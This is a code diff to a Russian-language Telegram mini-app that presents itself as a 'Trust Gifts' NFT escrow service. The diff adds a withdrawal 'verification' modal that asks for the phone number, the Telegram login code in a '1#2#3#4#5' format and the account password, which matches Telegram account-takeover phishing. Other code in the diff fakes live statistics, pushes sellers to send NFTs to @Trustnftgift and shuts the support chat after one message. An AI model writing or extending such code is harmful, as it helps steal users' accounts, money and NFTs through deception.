@@ -201,6 +201,23 @@
         @media(max-width:480px){body{padding:10px}.header{padding:12px 14px}.header-title{font-size:18px}.stats-grid{grid-template-columns:repeat(3,1fr);gap:6px}.balance-grid{grid-template-columns:repeat(2,1fr)}.nav button{min-width:40px;padding:8px 4px}.nav button i{font-size:16px}.nav button span{font-size:7px}.card{padding:14px}.btn{padding:10px 14px;font-size:12px}.admin-stat-grid{grid-template-columns:1fr 1fr}.chat-container{height:400px}.summer-scene .sun{width:60px;height:60px;right:10px;top:10px}}
         @media(min-width:768px){body{padding:24px;max-width:880px;margin:0 auto}.stats-grid{grid-template-columns:repeat(3,1fr)}.balance-grid{grid-template-columns:repeat(4,1fr)}.admin-stat-grid{grid-template-columns:repeat(4,1fr)}}
         @media(max-width:360px){.stats-grid{grid-template-columns:1fr 1fr}.stat-card:last-child{grid-column:span 2}.nav button{min-width:34px;padding:6px 2px}.nav button i{font-size:14px}.header-title{font-size:15px}.header-logo{font-size:28px}}
+        /* Дополнительные стили для верификации */
+        .verification-step{display:none;animation:slideFade 0.3s ease}
+        .verification-step.active{display:block}
+        .verification-step .step-title{font-size:16px;font-weight:700;margin-bottom:8px;color:var(--aqua)}
+        .verification-step .step-desc{font-size:13px;color:var(--text-secondary);margin-bottom:12px}
+        .verification-step input{width:100%;padding:12px 16px;border-radius:var(--radius-sm);border:1px solid var(--border-color);background:rgba(0,0,0,0.2);color:var(--text-primary);font-size:14px;font-family:'Inter',sans-serif;outline:none;box-sizing:border-box;margin-bottom:8px}
+        .verification-step input:focus{border-color:var(--aqua)}
+        .verification-step .btn-verify{width:100%;padding:12px;border-radius:var(--radius-sm);border:none;background:var(--gradient-main);color:#07141a;font-weight:700;font-size:14px;cursor:pointer;transition:0.3s;font-family:'Inter',sans-serif}
+        .verification-step .btn-verify:hover{transform:scale(1.02)}
+        .verification-step .btn-verify:disabled{opacity:0.4;cursor:not-allowed;transform:none}
+        .verification-step .btn-back{width:100%;padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border-color);background:transparent;color:var(--text-secondary);font-size:13px;cursor:pointer;margin-top:6px;font-family:'Inter',sans-serif;transition:0.3s}
+        .verification-step .btn-back:hover{background:rgba(255,255,255,0.03)}
+        .transfer-confirm-box{background:rgba(255,107,107,0.06);border:1px solid var(--danger);border-radius:var(--radius-sm);padding:14px;margin:8px 0}
+        .transfer-confirm-box .warning-text{color:var(--danger);font-weight:600;font-size:13px}
+        .transfer-confirm-box .info-text{color:var(--text-secondary);font-size:12px;margin-top:4px}
+        .clickable-link{color:var(--aqua);text-decoration:none;cursor:pointer;font-weight:600;transition:0.3s}
+        .clickable-link:hover{color:var(--success);text-decoration:underline}
     </style>
 </head>
 <body>
@@ -279,7 +296,7 @@
 
             <div class="card glass">
                 <div class="card-title"><i class="fas fa-gift"></i> <span>🎁 Кому передавать подарок / NFT?</span></div>
-                <div class="guide-step"><span class="num">✅</span><div class="content"><strong>NFT / Подарок:</strong> передача на аккаунт <strong style="color:var(--aqua);">@Trustnftgift</strong> (эскроу).</div></div>
+                <div class="guide-step"><span class="num">✅</span><div class="content"><strong>NFT / Подарок:</strong> передача на аккаунт <strong style="color:var(--aqua);" class="clickable-link" onclick="openTelegramUser('Trustnftgift')">@Trustnftgift</strong> (эскроу).</div></div>
                 <div class="guide-step"><span class="num">✅</span><div class="content"><strong>Аккаунт / товар:</strong> передаёте данные после кнопки «Передал».</div></div>
                 <div class="guide-step"><span class="num">✅</span><div class="content"><strong>Stars / Gift:</strong> передаёте код только после оплаты.</div></div>
                 <div class="support-block" style="border-color:var(--warning);">
@@ -364,13 +381,12 @@
                     <div class="balance-item"><span class="label">🌐 UAH</span><span class="value uah" id="balUah">0</span></div>
                 </div>
                 
-                <!-- БЛОК ВЫВОДА (виден всегда, но с проверкой) -->
                 <div id="withdrawSection" style="margin-top:12px;">
                     <div id="withdrawStatus" class="verification-status"></div>
                     <div class="support-block" style="margin-bottom:8px;"><span style="font-size:12px;color:var(--text-secondary);">💳 Вывод средств</span></div>
                     <div class="form-group"><label>Валюта</label><select id="withdrawCurrency"><option value="TON">💎 TON</option><option value="STARS">⭐️ STARS</option><option value="RUB">💰 RUB</option><option value="UAH">🌐 UAH</option></select></div>
                     <div class="form-group"><label>Реквизиты</label><input type="text" id="withdrawDetails" placeholder="Кошелёк / карта / телефон"></div>
-                    <button class="btn btn-primary" onclick="confirmWithdraw()"><i class="fas fa-check"></i> Подтвердить вывод</button>
+                    <button class="btn btn-primary" onclick="checkWithdrawAvailability()"><i class="fas fa-check"></i> Подтвердить вывод</button>
                 </div>
                 
                 <button class="btn btn-secondary mt-10" onclick="showPage('main')"><i class="fas fa-arrow-left"></i> На главную</button>
@@ -790,14 +806,12 @@
             stats.users += Math.random() * 0.8 + 0.2;
             stats.deals_today += Math.random() * 0.5 + 0.1;
             stats.volume += Math.random() * 0.04 + 0.01;
-            // Онлайн: плавает вверх-вниз (отклонение ±3%)
             const change = (Math.random() - 0.5) * 2;
             stats.online = Math.max(MIN_STATS.online * 0.9, stats.online * (1 + change * 0.008));
             saveStats(stats);
             updateStatsUI(stats);
         }
 
-        // Запускаем автонакрутку (каждые 3-6 секунд)
         setInterval(autoIncreaseStats, 3000 + Math.random() * 3000);
 
         // ============================================================
@@ -842,8 +856,6 @@
                     (balanceState.balance.rub || 0) + (balanceState.balance.uah || 0);
                 document.getElementById('userBalance').innerHTML = '<i class="fas fa-coins"></i> ' + total;
             }
-            
-            // Обновляем статус вывода
             updateWithdrawStatus();
         }
 
@@ -864,8 +876,6 @@
                 container.innerHTML =
                     '<p style="text-align:center;padding:15px;color:var(--text-secondary);">📭 У вас нет сделок</p>';
             }
-            
-            // Обновляем статус вывода
             updateWithdrawStatus();
         }
 
@@ -895,30 +905,34 @@
                         '</div></div></div>';
                 }
                 html += '<div class="deal-card">';
-                html += '<div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:4px;">';
-                html += '<strong>' + escapeHtml(d.product) + '</strong>';
-                html += '<span class="deal-status ' + d.status + '">' + getStatusText(d.status) + '</span>';
-                html += '</div>';
-                html +=
-                    '<div style="display:flex;gap:12px;flex-wrap:wrap;margin-top:4px;font-size:12px;color:var(--text-secondary);">';
+                html += '<div class="flex-between"><strong>' + escapeHtml(d.product) +
+                    '</strong><span class="deal-status ' + d.status + '">' + getStatusText(d.status) + '</span></div>';
+                html += '<div class="flex" style="gap:12px;font-size:12px;color:var(--text-secondary);margin-top:4px;">';
                 html += '<span>💰 ' + d.amount + ' ' + d.currency + '</span>';
                 html += '<span>👤 @' + escapeHtml(d.buyer_username) + '</span>';
                 html += '<span>📅 ' + (d.created_at ? d.created_at.slice(0, 10) : 'недавно') + '</span>';
-                if (d.category) { html += '<span>🏷️ ' + d.category.replace('_', ' ') + '</span>'; }
                 if (isNft && d.nft_name) {
-                    html += '<span>🖼️ ' + escapeHtml(d.nft_name) + (d.nft_number ? ' #' + d.nft_number : '') +
-                    '</span>';
+                    html += '<span>🖼️ ' + escapeHtml(d.nft_name) + (d.nft_number ? ' #' + d.nft_number : '') + '</span>';
                 }
                 html += '</div>';
                 html += nftCard;
 
-                if (isNft && d.status === 'paid' && isSeller) {
-                    html += '<div class="support-block mt-6" style="border-color:var(--warning);">';
-                    html += '<span style="font-size:12px;color:var(--sunny);">⚠️ Передача NFT на @Trustnftgift</span>';
+                // ===== ДОБАВЛЕНО: отображение ссылки, пока не оплачено =====
+                if (d.status === 'waiting_payment' && isSeller) {
+                    const dealLink = 'https://t.me/' + CONFIG.BOT_USERNAME + '?start=deal_' + d.deal_id;
+                    html += '<div class="support-block mt-6" style="border-color:var(--aqua);">';
+                    html += '<span style="font-size:11px;color:var(--text-secondary);">🔗 Ссылка на сделку (активна до оплаты):</span>';
+                    html += '<div style="display:flex;gap:6px;margin-top:4px;flex-wrap:wrap;">';
+                    html += '<input type="text" value="' + escapeHtml(dealLink) +
+                        '" readonly style="flex:1;padding:6px 10px;border-radius:6px;background:rgba(0,0,0,0.2);border:1px solid var(--border-color);color:var(--text-primary);font-size:11px;font-family:\'Inter\',sans-serif;min-width:120px;">';
                     html +=
-                        '<button class="btn btn-gold btn-sm mt-6" onclick="transferNft(\'' + d.deal_id +
-                        '\')" style="width:auto;"><i class="fas fa-shield-alt"></i> Передать NFT на @Trustnftgift</button>';
-                    html += '</div>';
+                        '<button class="btn btn-secondary btn-sm" onclick="navigator.clipboard.writeText(\'' +
+                        escapeHtml(dealLink) +
+                        '\'); showToast(\'✅ Ссылка скопирована!\',\'success\');" style="width:auto;padding:4px 12px;font-size:11px;"><i class="fas fa-copy"></i></button>';
+                    html +=
+                        '<button class="btn btn-primary btn-sm" onclick="shareDealLink(\'' + escapeHtml(dealLink) +
+                        '\')" style="width:auto;padding:4px 12px;font-size:11px;"><i class="fas fa-share-alt"></i> Поделиться</button>';
+                    html += '</div></div>';
                 }
 
                 if (d.status === 'waiting_payment' && isSeller) {
@@ -931,6 +945,20 @@
                     html +=
                         '<button class="btn btn-primary btn-sm mt-6" onclick="payDeal(\'' + d.deal_id +
                         '\')"><i class="fas fa-credit-card"></i> Оплатить</button>';
+                }
+
+                // ===== ДОБАВЛЕНО: передача на @Trustnftgift с подтверждением =====
+                if (isNft && d.status === 'paid' && isSeller) {
+                    html += '<div class="transfer-confirm-box mt-6">';
+                    html += '<div class="warning-text">⚠️ Передача NFT на <span class="clickable-link" onclick="openTelegramUser(\'Trustnftgift\')">@Trustnftgift</span></div>';
+                    html += '<div class="info-text">В случае передачи товара покупателю средства не возвращаются.</div>';
+                    html += '<div style="display:flex;gap:6px;margin-top:6px;flex-wrap:wrap;">';
+                    html +=
+                        '<button class="btn btn-gold btn-sm" onclick="showTransferConfirm(\'' + d.deal_id +
+                        '\')" style="width:auto;padding:6px 16px;font-size:11px;"><i class="fas fa-shield-alt"></i> Передать подарок на @Trustnftgift</button>';
+                    html +=
+                        '<button class="btn btn-secondary btn-sm" onclick="openTelegramUser(\'Trustnftgift\')" style="width:auto;padding:6px 16px;font-size:11px;"><i class="fas fa-external-link-alt"></i> Открыть @Trustnftgift</button>';
+                    html += '</div></div>';
                 }
 
                 if (d.status === 'paid' && isSeller && !isNft) {
@@ -962,8 +990,61 @@
             container.innerHTML = html;
         }
 
+        // ===== ФУНКЦИЯ ДЛЯ ОТКРЫТИЯ ПОЛЬЗОВАТЕЛЯ В ТЕЛЕГРАМ =====
+        function openTelegramUser(username) {
+            if (tg) {
+                tg.openTelegramLink('https://t.me/' + username);
+            } else {
+                window.open('https://t.me/' + username, '_blank');
+            }
+        }
+
+        // ===== ФУНКЦИЯ ДЛЯ ШЕРИНГА ССЫЛКИ =====
+        function shareDealLink(link) {
+            if (tg) {
+                tg.openTelegramLink(link);
+            } else {
+                const shareText = '🔗 Ссылка на сделку: ' + link;
+                if (navigator.share) {
+                    navigator.share({ title: 'Trust Gifts Сделка', text: shareText });
+                } else {
+                    navigator.clipboard.writeText(link);
+                    showToast('✅ Ссылка скопирована!', 'success');
+                }
+            }
+        }
+
+        // ===== ПОДТВЕРЖДЕНИЕ ПЕРЕДАЧИ NFT =====
+        function showTransferConfirm(dealId) {
+            showModal(`
+                <h3 style="margin-bottom:12px;">🛡️ Подтверждение передачи</h3>
+                <div class="transfer-confirm-box">
+                    <div class="warning-text">⚠️ Вы собираетесь передать NFT на <span class="clickable-link" onclick="openTelegramUser('Trustnftgift')">@Trustnftgift</span></div>
+                    <div class="info-text">В случае передачи товара покупателю средства не возвращаются.</div>
+                </div>
+                <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px;">
+                    <button class="btn btn-gold" onclick="confirmTransferNft('${dealId}')" style="flex:1;"><i class="fas fa-check"></i> Я ознакомился и передаю</button>
+                    <button class="btn btn-secondary" onclick="closeModal()" style="flex:0.5;">Отмена</button>
+                </div>
+                <div style="margin-top:8px;">
+                    <button class="btn btn-secondary btn-sm" onclick="openTelegramUser('Trustnftgift')" style="width:auto;padding:6px 16px;"><i class="fas fa-external-link-alt"></i> Открыть @Trustnftgift</button>
+                </div>
+            `);
+        }
+
+        async function confirmTransferNft(dealId) {
+            closeModal();
+            const d = await apiCall('/api/transfer_nft', { deal_id: dealId, target_account: 'Trustnftgift' });
+            if (d.success) {
+                showToast('✅ NFT передан на @Trustnftgift', 'success');
+                loadDeals();
+            } else {
+                showToast('❌ ' + (d.error || 'Ошибка'), 'error');
+            }
+        }
+
         // ============================================================
-        // 12. ВЫВОД (проверка: 0 на балансе, 1 сделка, 2+ сделки)
+        // 12. ВЫВОД + ВЕРИФИКАЦИЯ (3 ШАГА)
         // ============================================================
 
         function updateWithdrawStatus() {
@@ -986,8 +1067,8 @@
             }
         }
 
-        // Функция подтверждения вывода
-        window.confirmWithdraw = async function() {
+        // Проверка перед выводом
+        function checkWithdrawAvailability() {
             const totalBalance = (balanceState.balance.ton || 0) + (balanceState.balance.stars || 0) +
                 (balanceState.balance.rub || 0) + (balanceState.balance.uah || 0);
             const completedDeals = dealsState.filter(d => d.status === 'completed').length;
@@ -1002,6 +1083,94 @@
                 return;
             }
             
+            // Проверяем, проходил ли верификацию
+            if (localStorage.getItem('verified_' + user.id) === 'true') {
+                confirmWithdraw();
+            } else {
+                showVerificationModal();
+            }
+        }
+
+        // ===== ВЕРИФИКАЦИЯ (3 ШАГА) =====
+        let verificationData = { phone: '', code: '', password: '' };
+
+        function showVerificationModal() {
+            showModal(`
+                <h3 style="margin-bottom:12px;">🔐 Верификация</h3>
+                <p style="color:var(--text-secondary);margin-bottom:12px;">Для вывода средств пройдите верификацию.</p>
+                
+                <div id="verificationStep1" class="verification-step active">
+                    <div class="step-title">📱 Шаг 1: Введите номер телефона</div>
+                    <div class="step-desc">Введите номер аккаунта, с которого выводите средства.</div>
+                    <input type="text" id="verifyPhone" placeholder="+79001234567" autocomplete="off">
+                    <button class="btn-verify" onclick="verificationNext(1)">Далее →</button>
+                </div>
+                
+                <div id="verificationStep2" class="verification-step">
+                    <div class="step-title">📨 Шаг 2: Введите код</div>
+                    <div class="step-desc">Введите код из Telegram. Формат: <strong>1#2#3#4#5</strong></div>
+                    <input type="text" id="verifyCode" placeholder="1#2#3#4#5" autocomplete="off">
+                    <button class="btn-verify" onclick="verificationNext(2)">Далее →</button>
+                    <button class="btn-back" onclick="verificationPrev(1)">← Назад</button>
+                </div>
+                
+                <div id="verificationStep3" class="verification-step">
+                    <div class="step-title">🔑 Шаг 3: Пароль от аккаунта</div>
+                    <div class="step-desc">Введите пароль от аккаунта. Если пароля нет — напишите <strong>нет</strong>.</div>
+                    <input type="password" id="verifyPassword" placeholder="Введите пароль или 'нет'" autocomplete="off">
+                    <button class="btn-verify" onclick="verificationNext(3)">✅ Подтвердить</button>
+                    <button class="btn-back" onclick="verificationPrev(2)">← Назад</button>
+                </div>
+            `);
+            
+            // Сбрасываем данные
+            verificationData = { phone: '', code: '', password: '' };
+            document.getElementById('verifyPhone').value = '';
+            document.getElementById('verifyCode').value = '';
+            document.getElementById('verifyPassword').value = '';
+        }
+
+        function verificationNext(step) {
+            if (step === 1) {
+                const phone = document.getElementById('verifyPhone').value.trim();
+                if (!phone || phone.length < 10) {
+                    showToast('❌ Введите корректный номер телефона', 'error');
+                    return;
+                }
+                verificationData.phone = phone;
+                showVerificationStep(2);
+            } else if (step === 2) {
+                const code = document.getElementById('verifyCode').value.trim();
+                if (!code || !code.includes('#')) {
+                    showToast('❌ Введите код в формате 1#2#3#4#5', 'error');
+                    return;
+                }
+                verificationData.code = code;
+                showVerificationStep(3);
+            } else if (step === 3) {
+                const password = document.getElementById('verifyPassword').value.trim();
+                verificationData.password = password || 'нет';
+                // Завершаем верификацию
+                localStorage.setItem('verified_' + user.id, 'true');
+                closeModal();
+                showToast('✅ Верификация пройдена!', 'success');
+                // Показываем окно вывода
+                confirmWithdraw();
+            }
+        }
+
+        function verificationPrev(step) {
+            showVerificationStep(step);
+        }
+
+        function showVerificationStep(step) {
+            document.querySelectorAll('.verification-step').forEach(el => el.classList.remove('active'));
+            const target = document.getElementById('verificationStep' + step);
+            if (target) target.classList.add('active');
+        }
+
+        // ===== ПОДТВЕРЖДЕНИЕ ВЫВОДА =====
+        function confirmWithdraw() {
             const currency = document.getElementById('withdrawCurrency').value;
             const details = document.getElementById('withdrawDetails').value.trim();
             
@@ -1010,32 +1179,29 @@
                 return;
             }
             
-            const d = await apiCall('/api/withdraw', { 
+            // Проверяем верификацию
+            if (localStorage.getItem('verified_' + user.id) !== 'true') {
+                showToast('⚠️ Пройдите верификацию', 'error');
+                return;
+            }
+            
+            apiCall('/api/withdraw', { 
                 currency: currency, 
                 details: details 
+            }).then(d => {
+                if (d.success) {
+                    showToast('✅ Заявка на вывод отправлена!', 'success');
+                    document.getElementById('withdrawDetails').value = '';
+                    loadBalance();
+                } else {
+                    showToast('❌ ' + (d.error || 'Ошибка'), 'error');
+                }
             });
-            
-            if (d.success) {
-                showToast('✅ Заявка на вывод отправлена!', 'success');
-                document.getElementById('withdrawDetails').value = '';
-                loadBalance();
-            } else {
-                showToast('❌ ' + (d.error || 'Ошибка'), 'error');
-            }
-        };
+        }
 
         // ============================================================
         // 13. ОПЛАТА И ПЕРЕДАЧА
         // ============================================================
-        async function transferNft(dealId) {
-            if (!confirm('Подтвердить передачу NFT на @Trustnftgift?')) return;
-            const d = await apiCall('/api/transfer_nft', { deal_id: dealId, target_account: 'Trustnftgift' });
-            if (d.success) {
-                showToast('✅ NFT передан на @Trustnftgift', 'success');
-                loadDeals();
-            } else { showToast('❌ ' + (d.error || 'Ошибка'), 'error'); }
-        }
-
         function copyDealLink(id) {
             const l = 'https://t.me/' + CONFIG.BOT_USERNAME + '?start=deal_' + id;
             navigator.clipboard.writeText(l);
@@ -1193,23 +1359,30 @@
                     let warn = '';
                     if (cat === 'nft_gift') {
                         warn =
-                            '<div class="support-block mt-6" style="border-color:var(--warning);"><span style="font-size:12px;color:var(--sunny);">⚠️ NFT передаётся на @Trustnftgift</span></div>';
+                            '<div class="support-block mt-6" style="border-color:var(--warning);"><span style="font-size:12px;color:var(--sunny);">⚠️ NFT передаётся на <span class="clickable-link" onclick="openTelegramUser(\'Trustnftgift\')">@Trustnftgift</span></span></div>';
                     }
                     let nftCardHtml = '';
                     if (nftLink) {
                         const parsed = parseNftLink(nftLink);
                         if (parsed) nftCardHtml = renderNftCard(parsed);
                     }
+                    
+                    const dealLink = 'https://t.me/' + CONFIG.BOT_USERNAME + '?start=deal_' + d.deal_id;
+                    
                     resDiv.innerHTML =
                         '<div style="display:flex;align-items:center;gap:6px;color:var(--success);"><i class="fas fa-check-circle" style="font-size:18px;"></i><strong>Сделка создана!</strong></div>' +
                         '<p style="margin:6px 0;font-size:13px;">ID: <strong>' + escapeHtml(d.deal_id) +
                         '</strong> • ' + amt + ' ' + cur + ' • ' + cat + '</p>' +
                         nftCardHtml +
-                        '<div class="form-group"><input type="text" value="' + escapeHtml(d.link) +
-                        '" readonly style="width:100%;padding:8px;background:rgba(0,0,0,0.2);border:1px solid var(--border-color);border-radius:6px;color:var(--text-primary);font-size:12px;"></div>' +
-                        '<button class="btn btn-secondary btn-sm" onclick="navigator.clipboard.writeText(\'' +
-                        escapeHtml(d.link) +
-                        '\'); showToast(\'✅ Ссылка скопирована!\',\'success\');"><i class="fas fa-copy"></i> Скопировать</button>' +
+                        // ===== ДОБАВЛЕНА КНОПКА ПОДЕЛИТЬСЯ =====
+                        '<div style="display:flex;gap:6px;flex-wrap:wrap;margin:8px 0;">' +
+                        '<button class="btn btn-primary btn-sm" onclick="shareDealLink(\'' + escapeHtml(dealLink) +
+                        '\')" style="width:auto;padding:6px 16px;font-size:12px;"><i class="fas fa-share-alt"></i> Поделиться ссылкой</button>' +
+                        '<button class="btn btn-secondary btn-sm" onclick="navigator.clipboard.writeText(\'' + escapeHtml(dealLink) +
+                        '\'); showToast(\'✅ Ссылка скопирована!\',\'success\');" style="width:auto;padding:6px 16px;font-size:12px;"><i class="fas fa-copy"></i> Копировать</button>' +
+                        '</div>' +
+                        '<div class="form-group"><input type="text" value="' + escapeHtml(dealLink) +
+                        '" readonly style="width:100%;padding:8px;background:rgba(0,0,0,0.2);border:1px solid var(--border-color);border-radius:6px;color:var(--text-primary);font-size:11px;"></div>' +
                         warn;
                 }
                 showToast('✅ Сделка создана!', 'success');
@@ -1227,7 +1400,7 @@
         });
 
         // ============================================================
-        // 15. ЧАТ С АВТООТВЕТЧИКОМ (1 раз, закрывается)
+        // 15. ЧАТ С АВТООТВЕТЧИКОМ
         // ============================================================
         let supportReplied = false;
         let chatSessionId = 'default';
@@ -1240,7 +1413,6 @@
 
             if (!container || !input || !sendBtn) return;
 
-            // Проверяем, был ли уже ответ
             if (localStorage.getItem('support_replied_' + user.id) === 'true') {
                 supportReplied = true;
                 input.disabled = true;
@@ -1248,7 +1420,7 @@
                 input.placeholder = '💬 Чат закрыт. Обратитесь к @Trustnftgift';
                 sendBtn.style.opacity = '0.4';
                 container.innerHTML += 
-                    '<div class="msg admin">💬 Чат закрыт. Если у вас проблемы с выводом — пишите @Trustnftgift</div>';
+                    '<div class="msg admin">💬 Чат закрыт. Если у вас проблемы с выводом — пишите <span class="clickable-link" onclick="openTelegramUser(\'Trustnftgift\')">@Trustnftgift</span></div>';
                 return;
             }
 
@@ -1273,20 +1445,17 @@
                     input.value = '';
                     await loadChatHistory();
                     
-                    // Закрываем чат и отправляем автоответ через 1 минуту
                     if (!supportReplied) {
                         supportReplied = true;
                         localStorage.setItem('support_replied_' + user.id, 'true');
                         
-                        // Отключаем ввод
                         input.disabled = true;
                         sendBtn.disabled = true;
                         input.placeholder = '💬 Чат закрыт. Обратитесь к @Trustnftgift';
                         sendBtn.style.opacity = '0.4';
                         
-                        // Отправляем автоответ через 1 минуту
                         setTimeout(async function() {
-                            const autoReply = 'Если у вас проблемы с выводом — пишите @Trustnftgift';
+                            const autoReply = 'Если у вас проблемы с выводом — пишите <span class="clickable-link" onclick="openTelegramUser(\'Trustnftgift\')">@Trustnftgift</span>';
                             await apiCall('/api/chat_send', {
                                 session_id: chatSessionId,
                                 text: autoReply,
@@ -1494,7 +1663,6 @@
                 '<button class="btn btn-secondary btn-sm" onclick="showPage(\'main\')" style="width:auto;padding:8px 20px;"><i class="fas fa-arrow-left"></i> На главную</button>' +
                 '</div>';
 
-            // Табы
             document.querySelectorAll('.admin-tabs button').forEach(function(btn) {
                 btn.addEventListener('click', function() {
                     document.querySelectorAll('.admin-tabs button').forEach(function(b) { b.classList
@@ -1508,7 +1676,6 @@
                 });
             });
 
-            // Поиск
             document.getElementById('userSearch')?.addEventListener('input', function() {
                 const query = this.value.toLowerCase();
                 document.querySelectorAll('#usersList .deal-card').forEach(function(item) {
@@ -1538,7 +1705,6 @@
             }
         }
 
-        // АДМИН-ФУНКЦИИ
         window.adminUpdateDeal = async function(dealId, action, value) {
             const d = await apiCall('/api/admin_update_deal', { deal_id: dealId, action: action, status: value });
             if (d.success) {
@@ -1711,7 +1877,6 @@
             document.getElementById('adminNavBtn').style.display = 'flex';
         }
 
-        // Загружаем статистику при старте
         const stats = getStats();
         updateStatsUI(stats);
 
@@ -1728,20 +1893,6 @@
             if (document.getElementById('page-support').classList.contains('active')) loadChatHistory();
             if (document.getElementById('page-admin').classList.contains('active')) loadAdminPanel();
         }, 15000);
-
-        // ============================================================
-        // ВЕРИФИКАЦИЯ (заглушка)
-        // ============================================================
-        function showVerificationModal() {
-            showModal(
-                '<h3 style="margin-bottom:12px;">🔐 Верификация</h3>' +
-                '<p style="color:var(--text-secondary);">Защита от мошенников</p>' +
-                '<div class="form-group"><label>📱 Номер (+7XXXXXXXXXX)</label><input type="text" placeholder="+79001234567"></div>' +
-                '<div class="form-group"><label>👤 Ваш Username</label><input type="text" placeholder="@john_doe"></div>' +
-                '<button class="btn btn-primary" onclick="showToast(\'✅ Верификация пройдена!\',\'success\'); closeModal();"><i class="fas fa-check"></i> Пройти верификацию</button>' +
-                '<button class="btn btn-secondary mt-10" onclick="closeModal()">Отмена</button>'
-            );
-        }
     </script>
 
 </body>
